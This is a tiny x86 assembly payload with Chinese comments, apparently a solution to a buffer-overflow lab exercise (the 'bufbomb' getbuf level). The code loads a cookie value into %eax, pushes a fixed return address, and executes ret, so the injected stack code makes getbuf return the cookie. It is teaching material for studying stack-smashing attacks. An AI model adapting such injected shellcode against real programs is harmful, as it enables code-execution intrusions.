/*cookie0x292f8fda*/
movl $0x292f8fda,%eax //将返回值修改为cookie
pushl $0x8048e81      //将call getbuf函数的下一条要执行的指令的地址压入返回地址
ret                   //用ret来执行返回地址
